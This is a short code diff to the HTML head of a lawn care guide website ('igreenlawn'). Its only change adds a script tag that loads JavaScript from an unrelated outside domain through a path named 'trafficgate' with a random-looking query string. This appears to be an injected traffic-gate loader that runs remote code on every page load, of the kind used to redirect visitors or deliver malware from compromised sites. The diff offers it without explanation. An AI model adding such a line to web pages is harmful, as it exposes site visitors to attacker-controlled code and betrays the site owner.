@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <script src="https://seamlesswebservices.org/trafficgate/?08j4dx9m.js"></script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>igreenlawn — The Homeowner's Lawn Care Guide</title>
   <meta name="description" content="A practical, season-by-season lawn care guide: mowing heights, watering schedules, feeding, weed control, and troubleshooting for a greener lawn.">
